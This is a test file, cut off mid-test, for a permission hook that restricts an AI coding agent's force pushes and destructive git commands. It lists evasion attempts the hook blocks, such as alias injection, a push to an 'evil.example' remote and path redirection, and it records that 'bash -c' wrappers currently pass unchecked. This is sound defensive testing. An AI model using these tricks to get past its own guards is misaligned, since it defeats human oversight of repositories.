/**
 * Integration tests: own-branch force-with-lease enforcement in the real
 * PreToolUse hook, against real throwaway git repos (no network, no real home).
 *
 * Run with: node --test ai-sdlc-plugin/hooks/enforce-lease-push.test.mjs
 */
import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import {
  chmodSync,
  symlinkSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { join, dirname } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const hookScript = join(__dirname, 'enforce-blocked-actions.js');

const BLOCKED = `  constraints:
    blockedPaths:
      - '.github/workflows/**'
      - '.ai-sdlc/**'
    blockedActions:
      - 'gh pr merge*'
      - 'git merge*'
      - 'git push --force*'
      - 'git push -f*'
      - 'git reset --hard*'
      - 'git checkout -- .'
      - 'git restore .'
`;
const roleYaml = (governance) =>
  `apiVersion: ai-sdlc.io/v1alpha1\nkind: AgentRole\nspec:\n  role: coding-agent\n  goal: test\n${governance}${BLOCKED}`;

const OWN = 'ai-sdlc/aisdlc-1-own';
const LEASE = `  governance:\n    allowForcePush: leaseOnOwnBranch\n    protectedBranches:\n      - release/*\n`;
// AISDLC-710: a repo that sets nothing gets leaseOnOwnBranch, so the strict value is explicit.
const NEVER = `  governance:\n    allowForcePush: never\n`;

let base;
let gitEnv;

function git(cwd, ...args) {
  return execFileSync('git', args, { cwd, env: gitEnv, encoding: 'utf-8' }).trim();
}

/** Builds main repo (+ bare origin) with the given policy; returns paths. */
function makeRepo(name, policyYaml, worktreeYaml) {
  const root = join(base, name);
  const bare = join(base, `${name}-origin.git`);
  mkdirSync(root, { recursive: true });
  git(root, 'init', '-q', '-b', 'main');
  mkdirSync(join(root, '.ai-sdlc'), { recursive: true });
  writeFileSync(join(root, '.ai-sdlc', 'agent-role.yaml'), policyYaml);
  writeFileSync(join(root, 'f.txt'), 'x');
  git(root, 'add', '-A');
  git(
    root,
    '-c',
    'user.name=t',
    '-c',
    'user.email=t@example.invalid',
    'commit',
    '-q',
    '-m',
    'init',
  );
  git(base, 'init', '-q', '--bare', bare);
  git(root, 'remote', 'add', 'origin', bare);
  const wt = join(root, '.worktrees', 'aisdlc-1');
  git(root, 'worktree', 'add', '-q', '-b', OWN, wt);
  writeFileSync(join(wt, '.active-task'), 'AISDLC-1\n');
  if (worktreeYaml !== undefined) {
    writeFileSync(join(wt, '.ai-sdlc', 'agent-role.yaml'), worktreeYaml);
  }
  return { root: realpathSync(root), wt: realpathSync(wt) };
}

function addTaskWorktree(root, n) {
  const dir = join(root, '.worktrees', `aisdlc-${n}`);
  git(root, 'worktree', 'add', '-q', '-b', `ai-sdlc/aisdlc-${n}-b`, dir);
  writeFileSync(join(dir, '.active-task'), `AISDLC-${n}\n`);
  return realpathSync(dir);
}

function invoke(payload, { cwd, projectDir, unsetProject = false, env: extraEnv = {} }) {
  const env = { ...gitEnv, ...extraEnv };
  if (!unsetProject) env.CLAUDE_PROJECT_DIR = projectDir;
  // A main-checkout-rooted session is bound to its own task by AI_SDLC_ACTIVE_TASK_ID
  // (set by the dispatcher, not the agent). Default it to the cwd worktree's task;
  // tests pass the variable explicitly (even '') to model a sibling or no binding.
  if (!('AI_SDLC_ACTIVE_TASK_ID' in extraEnv) && existsSync(join(cwd, '.active-task'))) {
    env.AI_SDLC_ACTIVE_TASK_ID = readFileSync(join(cwd, '.active-task'), 'utf-8').split('\n')[0];
  }
  try {
    return execFileSync('node', [hookScript], {
      input: JSON.stringify({ ...payload, cwd }),
      cwd,
      env,
      encoding: 'utf-8',
      timeout: 10000,
    }).trim();
  } catch (err) {
    return err.stdout?.trim() || '';
  }
}
const run = (command, opts) => invoke({ tool_name: 'Bash', tool_input: { command } }, opts);
const runWrite = (file_path, opts) =>
  invoke({ tool_name: 'Write', tool_input: { file_path } }, opts);
const denied = (out) => {
  try {
    return JSON.parse(out).hookSpecificOutput?.permissionDecision === 'deny';
  } catch {
    return false;
  }
};

let leaseRepo;
let neverRepo;
let wtCopyRepo;
let inverseRepo;

before(() => {
  base = realpathSync(mkdtempSync(join(tmpdir(), 'lease-push-')));
  const cfg = join(base, 'gitconfig');
  writeFileSync(cfg, '');
  gitEnv = {
    PATH: process.env.PATH,
    HOME: base,
    GIT_CONFIG_GLOBAL: cfg,
    GIT_CONFIG_NOSYSTEM: '1',
    GIT_TERMINAL_PROMPT: '0',
  };
  leaseRepo = makeRepo('lease', roleYaml(LEASE));
  neverRepo = makeRepo('never', roleYaml(NEVER));
  // Trusted (main checkout) policy = never; PR-tree copy in the worktree = lease.
  wtCopyRepo = makeRepo('wtcopy', roleYaml(NEVER), roleYaml(LEASE));
  // Trusted policy = lease; worktree copy sets never -> the copy can only tighten: denied.
  inverseRepo = makeRepo('inverse', roleYaml(LEASE), roleYaml(NEVER));
});

after(() => rmSync(base, { recursive: true, force: true }));

// The single accepted spelling (L and LF are the same); LN is the REFUSED no-colon form.
const L = () => `git push --force-with-lease origin HEAD:refs/heads/${OWN}`;
const LF = L;
const LN = () => `git push --force-with-lease origin ${OWN}`;

describe('leaseOnOwnBranch - allowed', () => {
  it('allows lease push of the worktree own branch (project dir = main checkout)', () => {
    const out = run(L(), { cwd: leaseRepo.wt, projectDir: leaseRepo.root });
    assert.ok(!denied(out), out);
  });

  it('allows when CLAUDE_PROJECT_DIR is the worktree itself (policy read from main checkout)', () => {
    const out = run(L(), { cwd: leaseRepo.wt, projectDir: leaseRepo.wt });
    assert.ok(!denied(out), out);
  });

  it('lease needs an explicit absolute CLAUDE_PROJECT_DIR: unset, empty or relative => denied', () => {
    // The toplevel fallback (kept for blockedActions) would make the own-session binding pass trivially.
    assert.ok(denied(run(L(), { cwd: leaseRepo.wt, unsetProject: true })), 'unset');
    assert.ok(denied(run(L(), { cwd: leaseRepo.wt, projectDir: '' })), 'empty');
    assert.ok(
      denied(run(L(), { cwd: leaseRepo.wt, projectDir: '.worktrees/aisdlc-1' })),
      'relative',
    );
    assert.ok(denied(run(L(), { cwd: leaseRepo.wt, projectDir: '.' })), 'dot');
    // set and valid: unchanged
    assert.ok(!denied(run(L(), { cwd: leaseRepo.wt, projectDir: leaseRepo.root })));
    assert.ok(!denied(run(L(), { cwd: leaseRepo.wt, projectDir: leaseRepo.wt })));
  });

  it('allows the fully-qualified HEAD:refs/heads/<own> form', () => {
    const out = run(LF(), {
      cwd: leaseRepo.wt,
      projectDir: leaseRepo.root,
    });
    assert.ok(!denied(out), out);
  });

  it('a worktree copy can only TIGHTEN: copy says never while trusted says lease -> blocked (fail closed)', () => {
    const out = run(L(), { cwd: inverseRepo.wt, projectDir: inverseRepo.wt });
    assert.ok(denied(out), out);
  });

  it('plain non-force push of own branch is unaffected', () => {
    const out = run(`git push origin ${OWN}`, { cwd: leaseRepo.wt, projectDir: leaseRepo.root });
    assert.ok(!denied(out), out);
  });
});

describe('leaseOnOwnBranch - blocked', () => {
  const cases = [
    ['lease to another branch', 'git push --force-with-lease origin other'],
    ['refspec own:other', `git push --force-with-lease origin ${OWN}:other`],
    ['HEAD:other', 'git push --force-with-lease origin HEAD:other'],
    ['HEAD:<own> (short destination)', `git push --force-with-lease origin HEAD:${OWN}`],
    ['<own>:<own> (short destination)', `git push --force-with-lease origin ${OWN}:${OWN}`],
    ['HEAD:main', 'git push --force-with-lease origin HEAD:main'],
    ['lease to main', 'git push --force-with-lease origin main'],
    ['lease to master', 'git push --force-with-lease origin master'],
    ['refs/heads/main', 'git push --force-with-lease origin refs/heads/main'],
    ['delete :main', 'git push --force-with-lease origin :main'],
    ['--delete own', `git push --force-with-lease --delete origin ${OWN}`],
    ['--mirror', 'git push --force-with-lease --mirror origin'],
    ['plain --force own branch', `git push --force origin ${OWN}`],
    ['-f own branch', `git push -f origin ${OWN}`],
    ['--force after args (no blockedAction prefix match)', `git push origin ${OWN} --force`],
    ['+refspec', `git push origin +${OWN}`],
    ['--force-if-includes alone', `git push --force-if-includes origin ${OWN}`],
    ['raw URL remote', `git push --force-with-lease https://evil.example/x.git ${OWN}`],
    ['unconfigured remote', `git push --force-with-lease evil ${OWN}`],
    ['chained', `${L()} && echo done`],
    ['cd elsewhere', `cd /tmp && ${L()}`],
    ['git -C', `git -C /tmp push --force-with-lease origin ${OWN}`],
    ['GIT_DIR prefix', `GIT_DIR=/tmp/x ${L()}`],
    ['--no-verify', `git push --no-verify --force-with-lease origin ${OWN}`],
    ['abbreviated flag', `git push --force-w origin ${OWN}`],
  ];
  for (const [name, cmd] of cases) {
    it(`blocks ${name}`, () => {
      const out = run(cmd, { cwd: leaseRepo.wt, projectDir: leaseRepo.root });
      assert.ok(denied(out), `${cmd} -> ${out}`);
    });
  }

  it('blocks a lease push from the main checkout on main (own branch is protected)', () => {
    const out = run('git push --force-with-lease origin main', {
      cwd: leaseRepo.root,
      projectDir: leaseRepo.root,
    });
    assert.ok(denied(out), out);
  });

  it('blocks a lease push of a policy-protected own branch', () => {
    git(leaseRepo.wt, 'checkout', '-q', '-b', 'release/1.0');
    const out = run('git push --force-with-lease origin release/1.0', {
      cwd: leaseRepo.wt,
      projectDir: leaseRepo.root,
    });
    git(leaseRepo.wt, 'checkout', '-q', OWN);
    assert.ok(denied(out), out);
  });

  it('blocks on a detached HEAD', () => {
    git(leaseRepo.wt, 'checkout', '-q', '--detach');
    const out = run(L(), { cwd: leaseRepo.wt, projectDir: leaseRepo.root });
    git(leaseRepo.wt, 'checkout', '-q', OWN);
    assert.ok(denied(out), out);
  });
});

describe('never / unset / malformed - behaves exactly as before', () => {
  it('blocks lease push under never (generic blockedActions pattern)', () => {
    assert.ok(denied(run(L(), { cwd: neverRepo.wt, projectDir: neverRepo.root })));
  });

  it('plain force push stays blocked under never', () => {
    assert.ok(
      denied(
        run(`git push --force origin ${OWN}`, { cwd: neverRepo.wt, projectDir: neverRepo.root }),
      ),
    );
  });

  it('with no agent-role.yaml the default (AISDLC-710) is leaseOnOwnBranch: own-branch lease allowed, other force shapes blocked', () => {
    const r = makeRepo('nopolicy', roleYaml(''));
    rmSync(join(r.root, '.ai-sdlc', 'agent-role.yaml'));
    const o = { cwd: r.wt, projectDir: r.root };
    assert.ok(!denied(run(L(), o)), 'own-branch lease is the default');
    assert.ok(denied(run(`git push origin ${OWN} --force`, o)));
    assert.ok(denied(run('git push --force-with-lease origin HEAD:refs/heads/main', o)));
    assert.ok(!denied(run(`git push origin ${OWN}`, o)));
  });

  it('AISDLC-710: a repo that sets nothing (no governance block) inherits leaseOnOwnBranch, scoped to the own branch', () => {
    const r = makeRepo('unsetgov', roleYaml(''));
    const o = { cwd: r.wt, projectDir: r.root };
    assert.ok(!denied(run(L(), o)), 'own branch lease allowed');
    // The canonical spelling is prompt-free end to end: no deny, no output at all.
    assert.equal(run(`git push --force-with-lease origin HEAD:refs/heads/${OWN}`, o), '');
    assert.ok(denied(run(`git push --force-with-lease origin HEAD`, o)), 'bare HEAD refused');
    assert.ok(denied(run(`git push --force-with-lease`, o)), 'no remote/refspec refused');
    assert.ok(denied(run(`git push --force-with-lease origin`, o)), 'no refspec refused');
    for (const cmd of [
      `git push --force origin HEAD:refs/heads/${OWN}`,
      `git push -f origin HEAD:refs/heads/${OWN}`,
      `git push origin +HEAD:refs/heads/${OWN}`,
      'git push --force-with-lease origin HEAD:refs/heads/main',
      'git push --force-with-lease origin main',
      'git push --force origin main',
      'git push --force-with-lease origin HEAD:refs/heads/ai-sdlc/aisdlc-2-other',
    ]) {
      assert.ok(denied(run(cmd, o)), cmd);
    }
    // An operator session in the main checkout (not a dispatched worktree) still gets no lease.
    assert.ok(denied(run(L(), { cwd: r.root, projectDir: r.root })));
  });

  it('AISDLC-710: a lease push to a branch another session owns is refused under the default', () => {
    const r = makeRepo('foreign', roleYaml(''));
    const wtB = addTaskWorktree(r.root, 2);
    const B = 'ai-sdlc/aisdlc-2-b';
    // From worktree A (task 1), pushing task 2's branch: not the own branch.
    assert.ok(
      denied(
        run(`git push --force-with-lease origin HEAD:refs/heads/${B}`, {
          cwd: r.wt,
          projectDir: r.root,
        }),
      ),
    );
    // A human-owned branch (no task prefix) checked out in the worktree gets no lease.
    git(r.wt, 'checkout', '-q', '-b', 'alice/feature');
    assert.ok(
      denied(
        run('git push --force-with-lease origin HEAD:refs/heads/alice/feature', {
          cwd: r.wt,
          projectDir: r.root,
        }),
      ),
    );
    git(r.wt, 'checkout', '-q', OWN);
    // Each genuine task worktree still gets its own.
    assert.ok(
      !denied(
        run(`git push --force-with-lease origin HEAD:refs/heads/${B}`, {
          cwd: wtB,
          projectDir: r.root,
        }),
      ),
    );
  });

  it('AISDLC-710: explicit never (and false) still refuse every lease push, and the refusal names the fix', () => {
    for (const [name, gov] of [
      ['exnever', NEVER],
      ['exfalse', `  governance:\n    allowForcePush: false\n`],
    ]) {
      const r = makeRepo(name, roleYaml(gov));
      const o = { cwd: r.wt, projectDir: r.root };
      for (const cmd of [
        L(),
        'git push --force-with-lease origin HEAD',
        'git push --force-with-lease',
      ]) {
        const out = run(cmd, o);
        assert.ok(denied(out), cmd);
        const reason = JSON.parse(out).hookSpecificOutput.permissionDecisionReason;
        assert.match(reason, /spec\.governance\.allowForcePush/);
        assert.match(reason, /leaseOnOwnBranch/);
        assert.doesNotMatch(reason, /SKIP_|AI_SDLC_|bypass|--no-verify|--force(?![-\w])/i, reason);
        // Agents must never edit .ai-sdlc/: the exit is to escalate to the operator.
        assert.doesNotMatch(reason, /\b(edit|change|modify|update|write)\b[^.]*agent-role\.yaml/i);
        assert.match(reason, /escalate/i, reason);
        assert.ok(reason.includes('git push --force-with-lease origin HEAD:refs/heads/'), reason);
      }
    }
  });

  for (const [label, line] of [
    ['trailing comment, parsed normally', null],
    ['inline map', '  governance: {allowForcePush: leaseOnOwnBranch}\n'],
    ['alias', '  governance: *anchor\n'],
    ['inline scalar', '  governance: never\n'],
  ]) {
    it(`unrecognised governance block fails closed (${label})`, () => {
      const yaml =
        line === null
          ? roleYaml('  governance:   # note\n    allowForcePush: never\n')
          : roleYaml(line);
      const r = makeRepo(`govblock-${label}`.replace(/\W/g, ''), yaml);
      assert.ok(denied(run(L(), { cwd: r.wt, projectDir: r.root })), label);
    });
  }

  it('AISDLC-710: refusals from the hook (not-in-worktree, policy never, other branch) never suggest a forbidden exit', () => {
    const r = makeRepo('refusals', roleYaml(''));
    const nv = makeRepo('refusals-never', roleYaml(NEVER));
    const reasons = [
      run(L(), { cwd: r.root, projectDir: r.root }), // operator checkout: no lease
      run(L(), { cwd: nv.wt, projectDir: nv.root }), // explicit never
      run('git push --force-with-lease origin HEAD:refs/heads/main', {
        cwd: r.wt,
        projectDir: r.root,
      }),
      run(`git push --force origin ${OWN}`, { cwd: r.wt, projectDir: r.root }),
      run(`git push -f origin ${OWN}`, { cwd: nv.wt, projectDir: nv.root }),
    ].map((out) => {
      assert.ok(denied(out), out);
      return JSON.parse(out).hookSpecificOutput.permissionDecisionReason;
    });
    for (const reason of reasons) {
      assert.match(reason, /spec\.governance\.allowForcePush/, reason);
      assert.match(reason, /leaseOnOwnBranch/, reason);
      assert.doesNotMatch(reason, /SKIP_|AI_SDLC_|bypass|--no-verify|--mirror/i, reason);
      assert.doesNotMatch(reason, /--force(?![-\w])/, reason);
      assert.doesNotMatch(reason, /(^|\s)-f(\s|$)/, reason);
    }
  });

  it('under never, non-prefix force shapes are blocked (strict mode is not bypassable by arg order)', () => {
    const o = { cwd: neverRepo.wt, projectDir: neverRepo.root };
    for (const cmd of [
      'git push origin --force main',
      'git push origin -f HEAD:main',
      'git push origin main --force-with-lease',
      'git push origin +main',
      'git push --forc origin main',
    ]) {
      assert.ok(denied(run(cmd, o)), cmd);
    }
    assert.ok(!denied(run('git push origin main', o)));
    assert.ok(!denied(run('git push --follow-tags origin x', o)));
  });

  for (const v of ['yes', 'always', 'LEASEONOWNBRANCH', '1']) {
    it(`malformed allowForcePush=${v} stays blocked`, () => {
      const r = makeRepo(
        `bad-${v}`.replace(/\W/g, ''),
        roleYaml(`  governance:\n    allowForcePush: ${v}\n`),
      );
      assert.ok(denied(run(L(), { cwd: r.wt, projectDir: r.root })));
    });
  }

  it('boolean false stays blocked', () => {
    const f = makeRepo('boolfalse', roleYaml(`  governance:\n    allowForcePush: false\n`));
    assert.ok(denied(run(L(), { cwd: f.wt, projectDir: f.root })));
  });

  it('boolean true is read as leaseOnOwnBranch (own branch only)', () => {
    const t = makeRepo('booltrue', roleYaml(`  governance:\n    allowForcePush: true\n`));
    assert.ok(!denied(run(L(), { cwd: t.wt, projectDir: t.root })));
    assert.ok(
      denied(run('git push --force-with-lease origin other', { cwd: t.wt, projectDir: t.root })),
    );
  });
});

describe('policy comes from the trusted checkout, never the PR tree', () => {
  it('worktree copy setting leaseOnOwnBranch has NO effect (project dir = worktree)', () => {
    assert.ok(denied(run(L(), { cwd: wtCopyRepo.wt, projectDir: wtCopyRepo.wt })));
  });

  it('same with CLAUDE_PROJECT_DIR unset', () => {
    assert.ok(denied(run(L(), { cwd: wtCopyRepo.wt, unsetProject: true })));
  });

  it('same with CLAUDE_PROJECT_DIR = main checkout', () => {
    assert.ok(denied(run(L(), { cwd: wtCopyRepo.wt, projectDir: wtCopyRepo.root })));
  });
});

describe('fixed integrity rules stay blocked under leaseOnOwnBranch', () => {
  const ctx = () => ({ cwd: leaseRepo.wt, projectDir: leaseRepo.root });

  it('blocks Write/Edit under .ai-sdlc/** (agent-role, attestations, verdicts)', () => {
    for (const rel of [
      '.ai-sdlc/agent-role.yaml',
      '.ai-sdlc/attestations/abc.v6.dsse.json',
      '.ai-sdlc/verdicts/some-task.json',
    ]) {
      assert.ok(denied(runWrite(join(leaseRepo.wt, rel), ctx())), rel);
    }
  });

  it('blocks governance relaxation from the PR tree (editing the worktree agent-role.yaml)', () => {
    assert.ok(
      denied(
        runWrite(join(wtCopyRepo.wt, '.ai-sdlc', 'agent-role.yaml'), {
          cwd: wtCopyRepo.wt,
          projectDir: wtCopyRepo.root,
        }),
      ),
    );
  });

  for (const cmd of [
    'git reset --hard HEAD~1',
    'git checkout -- .',
    'git restore .',
    ['gh', 'pr', 'merge', '5', '--squash'].join(' '),
    'git stash pop',
    'git stash clear',
  ]) {
    it(`blocks ${cmd}`, () => {
      assert.ok(denied(run(cmd, ctx())), cmd);
    });
  }

  it('the lease allowance does not exempt other blockedActions (chained reset)', () => {
    assert.ok(denied(run(`${L()}; git reset --hard`, ctx())));
  });
});

// ── Round-2 additions ────────────────────────────────────────────────

/** Installs a logging `git` shim in front of PATH; optionally failing --git-common-dir. */
function makeGitShim(name) {
  const realGit = execFileSync('which', ['git'], { encoding: 'utf-8' }).trim();
  const dir = join(base, `shim-${name}`);
  mkdirSync(dir, { recursive: true });
  const log = join(dir, 'calls.log');
  writeFileSync(
    join(dir, 'git'),
    `#!/bin/sh
echo "$*" >> "${log}"
if [ -n "$GIT_SHIM_FAIL_COMMON" ]; then
  case "$*" in *--git-common-dir*) exit 1;; esac
fi
if [ -n "$GIT_SHIM_FAIL_VERIFY" ]; then
  case "$*" in *--verify*) exit 128;; esac
fi
exec "${realGit}" "$@"
`,
  );
  chmodSync(join(dir, 'git'), 0o755);
  return { dir, log, env: { PATH: `${dir}:${process.env.PATH}` } };
}
const calls = (shim) => (existsSync(shim.log) ? readFileSync(shim.log, 'utf-8').trim() : '');

describe('protected-branch bypass via git short-name resolution (regression)', () => {
  let r;
  before(() => {
    r = makeRepo(
      'shortname',
      roleYaml(
        `  governance:\n    allowForcePush: leaseOnOwnBranch\n    protectedBranches:\n      - develop\n`,
      ),
    );
    git(r.root, 'push', '-q', 'origin', 'main:develop');
    git(r.wt, 'fetch', '-q', 'origin');
    git(r.wt, 'checkout', '-q', '-b', 'heads/develop', 'origin/develop');
  });

  it('REPRODUCTION: git really resolves HEAD:heads/develop to the remote refs/heads/develop', () => {
    git(
      r.wt,
      '-c',
      'user.name=t',
      '-c',
      'user.email=t@example.invalid',
      'commit',
      '-q',
      '--allow-empty',
      '-m',
      'diverge',
    );
    const before = git(r.wt, 'ls-remote', 'origin', 'refs/heads/develop');
    git(r.wt, 'push', '-q', '--force-with-lease', 'origin', 'HEAD:heads/develop');
    const after = git(r.wt, 'ls-remote', 'origin', 'refs/heads/develop');
    assert.notEqual(before, after, 'the unguarded push updated the remote develop branch');
  });

  for (const cmd of [
    'git push --force-with-lease origin HEAD:heads/develop',
    'git push --force-with-lease origin heads/develop:heads/develop',
    'git push --force-with-lease origin heads/develop',
    'git push --force-with-lease origin HEAD:refs/heads/develop',
  ]) {
    it(`blocks ${cmd}`, () => {
      assert.ok(denied(run(cmd, { cwd: r.wt, projectDir: r.root })), cmd);
    });
  }

  it('blocks ambiguously named own branches (heads/main, refs/heads/main, tags/x, remotes/origin/main)', () => {
    for (const name of ['heads/main', 'refs/heads/main', 'tags/x', 'remotes/origin/main']) {
      git(r.wt, 'checkout', '-q', '-B', name);
      for (const cmd of [
        `git push --force-with-lease origin HEAD:${name}`,
        `git push --force-with-lease origin ${name}`,
        'git push --force-with-lease origin HEAD:heads/main',
      ]) {
        assert.ok(denied(run(cmd, { cwd: r.wt, projectDir: r.root })), `${name}: ${cmd}`);
      }
    }
  });
});

describe('fail-closed paths and git-subprocess discipline', () => {
  it('non-git cwd under a lease policy: lease push is denied', () => {
    const nongit = realpathSync(mkdtempSync(join(tmpdir(), 'lease-nongit-')));
    try {
      assert.ok(denied(run(L(), { cwd: nongit, projectDir: leaseRepo.root })));
    } finally {
      rmSync(nongit, { recursive: true, force: true });
    }
  });

  it('cwd in a DIFFERENT repo than the project dir: denied', () => {
    const other = makeRepo('otherrepo', roleYaml(LEASE));
    assert.ok(denied(run(L(), { cwd: other.wt, projectDir: leaseRepo.root })));
  });

  it('trusted main-checkout policy unreadable while the project-dir copy says lease: denied', () => {
    const r = makeRepo('nomain', roleYaml(LEASE), roleYaml(LEASE));
    rmSync(join(r.root, '.ai-sdlc', 'agent-role.yaml'));
    // A directory where the file should be: unreadable (not "absent"), so fail closed.
    mkdirSync(join(r.root, '.ai-sdlc', 'agent-role.yaml'));
    assert.ok(denied(run(L(), { cwd: r.wt, projectDir: r.wt })));
  });

  it('trusted main-checkout policy MISSING (repo sets nothing): the default lease applies (AISDLC-710)', () => {
    const r = makeRepo('nomainmissing', roleYaml(LEASE), roleYaml(LEASE));
    rmSync(join(r.root, '.ai-sdlc', 'agent-role.yaml'));
    assert.ok(!denied(run(L(), { cwd: r.wt, projectDir: r.wt })));
  });

  it('project-dir copy unreadable (directory in its place): no lease, blockedActions behave as before', () => {
    const r = makeRepo('unreadable', roleYaml(LEASE));
    rmSync(join(r.root, '.ai-sdlc', 'agent-role.yaml'));
    mkdirSync(join(r.root, '.ai-sdlc', 'agent-role.yaml'));
    // No readable policy at all: nothing new is enforced or granted.
    assert.ok(!denied(run(`git push origin ${OWN}`, { cwd: r.wt, projectDir: r.root })));
  });

  it('git failing to report the common dir (old git): fail closed to never', () => {
    const shim = makeGitShim('nocommon');
    const out = run(L(), {
      cwd: leaseRepo.wt,
      projectDir: leaseRepo.root,
      env: { ...shim.env, GIT_SHIM_FAIL_COMMON: '1' },
    });
    assert.ok(denied(out), out);
  });

  it('`never` runs NO git subprocess at all (policy decided from file text)', () => {
    const shim = makeGitShim('never');
    const out = run(L(), { cwd: neverRepo.wt, projectDir: neverRepo.root, env: shim.env });
    assert.ok(denied(out), 'still blocked by blockedActions');
    assert.equal(calls(shim), '', 'no git calls');
  });

  it('lease mode does run git (sanity check on the shim)', () => {
    const shim = makeGitShim('lease');
    run(L(), { cwd: leaseRepo.wt, projectDir: leaseRepo.root, env: shim.env });
    assert.match(calls(shim), /symbolic-ref -q HEAD/);
    assert.match(calls(shim), /--git-common-dir/);
  });

  it('own-session binding: a project dir that is worktree A gets no lease from sibling worktree B', () => {
    const wtB = addTaskWorktree(leaseRepo.root, 2);
    const B = 'ai-sdlc/aisdlc-2-b';
    const pushB = `git push --force-with-lease origin HEAD:refs/heads/${B}`;
    // Both worktrees are genuine and task-bound. Session rooted at A (leaseRepo.wt):
    assert.ok(!denied(run(L(), { cwd: leaseRepo.wt, projectDir: leaseRepo.wt })), 'allowed from A');
    assert.ok(denied(run(pushB, { cwd: wtB, projectDir: leaseRepo.wt })), 'denied from sibling B');
    assert.ok(denied(run(L(), { cwd: wtB, projectDir: leaseRepo.wt })));
    // Session rooted at B: allowed from B, denied from A.
    assert.ok(!denied(run(pushB, { cwd: wtB, projectDir: wtB })), 'allowed from B');
    assert.ok(denied(run(L(), { cwd: leaseRepo.wt, projectDir: wtB })), 'denied from A');
    // Session rooted at the main checkout is bound to ONE task by AI_SDLC_ACTIVE_TASK_ID:
    // its own worktree works, a sibling it cd'd into does not, no binding means no lease.
    const bound = (id) => ({ env: { AI_SDLC_ACTIVE_TASK_ID: id } });
    assert.ok(!denied(run(pushB, { cwd: wtB, projectDir: leaseRepo.root, ...bound('AISDLC-2') })));
    assert.ok(
      !denied(run(L(), { cwd: leaseRepo.wt, projectDir: leaseRepo.root, ...bound('AISDLC-1') })),
    );
    assert.ok(
      denied(run(pushB, { cwd: wtB, projectDir: leaseRepo.root, ...bound('AISDLC-1') })),
      'cd into sibling worktree refused',
    );
    assert.ok(
      denied(run(L(), { cwd: leaseRepo.wt, projectDir: leaseRepo.root, ...bound('AISDLC-2') })),
    );
    assert.ok(
      denied(run(L(), { cwd: leaseRepo.wt, projectDir: leaseRepo.root, ...bound('') })),
      'no binding refused',
    );
    assert.ok(
      denied(run(L(), { cwd: leaseRepo.root, projectDir: leaseRepo.root, ...bound('AISDLC-1') })),
      'operator main-checkout session refused',
    );
    // project dir = A whose copy says lease while the main checkout says never: blocked.
    const wcB = addTaskWorktree(wtCopyRepo.root, 2);
    assert.ok(denied(run(pushB, { cwd: wcB, projectDir: wtCopyRepo.wt })));
  });
});

describe('shell wrappers and env tricks (documented; unchanged from before this feature)', () => {
  const ctx = () => ({ cwd: leaseRepo.wt, projectDir: leaseRepo.root });

  it('bash -c / sh -c payloads are not parsed by this hook or by the legacy prefix patterns', () => {
    assert.ok(!denied(run("bash -c 'git push --force-with-lease origin main'", ctx())));
    assert.ok(!denied(run("sh -c 'git push -f origin main'", ctx())));
  });

  it('xargs git push is seen and blocked', () => {
    assert.ok(denied(run('xargs git push --force-with-lease origin main', ctx())));
  });

  it('NBSP-separated lease push is blocked', () => {
    assert.ok(denied(run(`git push --force-with-lease origin\u00a0${OWN}`, ctx())));
  });

  it('env-prefixed GIT_CONFIG_COUNT alias injection is blocked', () => {
    assert.ok(
      denied(
        run(
          'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.zz GIT_CONFIG_VALUE_0=push git zz --force origin main',
          ctx(),
        ),
      ),
    );
  });
});

describe('adopter blockedActions that are not about force flags keep applying to an allowed lease push', () => {
  it('a `git push *develop*` pattern still blocks, while the force patterns are exempted', () => {
    const r = makeRepo(
      'adopterpattern',
      roleYaml(LEASE).replace("- 'git push -f*'", "- 'git push -f*'\n      - 'git push *develop*'"),
    );
    git(r.wt, 'checkout', '-q', '-b', 'ai-sdlc/aisdlc-1-develop-x');
    assert.ok(
      denied(
        run('git push --force-with-lease origin feat/develop-x', { cwd: r.wt, projectDir: r.root }),
      ),
    );
    git(r.wt, 'checkout', '-q', OWN);
    assert.ok(!denied(run(L(), { cwd: r.wt, projectDir: r.root })));
  });
});

describe('CI-skip floor does not depend on allowForcePush', () => {
  // The PreToolUse hook deliberately does NOT enforce CI-skip tokens; the
  // pre-push gate script does, and it never reads governance policy at all.
  // This pins that: the script blocks a token-carrying commit under both settings.
  const script = join(__dirname, '..', '..', 'scripts', 'check-skip-ci-marker.sh');
  // Built at runtime so no literal magic token appears in any committed file.
  const token = ['[', 'skip', ' ', 'ci', ']'].join('');
  const ZERO = '0'.repeat(40);

  function scan(repo, message) {
    git(
      repo.root,
      '-c',
      'user.name=t',
      '-c',
      'user.email=t@example.invalid',
      'commit',
      '-q',
      '--allow-empty',
      '-m',
      message,
    );
    const sha = git(repo.root, 'rev-parse', 'HEAD');
    return spawnSync('bash', [script], {
      cwd: repo.root,
      env: gitEnv,
      input: `refs/heads/x ${sha} refs/heads/x ${ZERO}\n`,
      encoding: 'utf-8',
    });
  }

  for (const [label, gov] of [
    ['never', ''],
    ['leaseOnOwnBranch', LEASE],
  ]) {
    it(`blocks a commit carrying a CI-skip token under ${label}`, () => {
      const r = makeRepo(`ciskip-${label}`, roleYaml(gov));
      const res = scan(r, `chore: x ${token}`);
      assert.equal(res.status, 1, res.stderr);
      assert.match(res.stderr, /CI-skip magic token/);
    });

    it(`passes a clean commit under ${label}`, () => {
      const r = makeRepo(`ciskipclean-${label}`, roleYaml(gov));
      assert.equal(scan(r, 'chore: x (skip ci marker)').status, 0);
    });
  }
});

describe('tag / notes / alias overwrite via short destination (regression, real git)', () => {
  const G = ['-c', 'user.name=t', '-c', 'user.email=t@example.invalid'];
  let r;
  before(() => {
    r = makeRepo('tagalias', roleYaml(LEASE));
    git(r.root, ...G, 'commit', '-q', '--allow-empty', '-m', 'seed');
    git(r.root, 'push', '-q', 'origin', 'main');
    git(r.root, 'tag', 'v1.2.3');
    git(r.root, 'push', '-q', 'origin', 'v1.2.3');
    git(r.wt, 'fetch', '-q', 'origin');
  });

  it('REPRODUCTION: a branch named like a remote tag force-overwrites that tag via HEAD:<name>', () => {
    git(r.wt, 'checkout', '-q', '-b', 'v1.2.3');
    git(r.wt, ...G, 'commit', '-q', '--allow-empty', '-m', 'divergent');
    const tagBefore = git(r.wt, 'ls-remote', 'origin', 'refs/tags/v1.2.3').split('\t')[0];
